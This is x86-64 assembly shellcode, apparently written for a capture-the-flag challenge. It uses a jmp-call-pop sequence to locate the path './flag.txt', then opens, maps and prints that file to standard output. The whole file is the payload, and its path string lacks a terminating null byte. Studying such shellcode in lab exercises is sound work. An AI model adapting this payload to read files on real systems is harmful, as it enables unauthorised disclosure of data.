BITS 64

global _start

section .text

_start:
    jmp push_filename

open_and_read:
    ; open file
    pop rdi
    xor rsi, rsi
    mov rax, 0x2
    syscall

    ; mmap file
    mov r8, rax
    mov rax, 9
    mov rdi, 0
    mov rsi, 4096
    mov rdx, 1
    mov r10, 2
    mov r9, 0
    syscall

    ; write mmap'd file to stdout
    mov rsi, rax
    mov rdi, 1
    mov rdx, 1024
    mov rax, 1
    syscall

    ; exit
    xor rax, rax
    mov rax, 0x3c
    syscall

push_filename:
    call open_and_read

    path: db "./flag.txt"
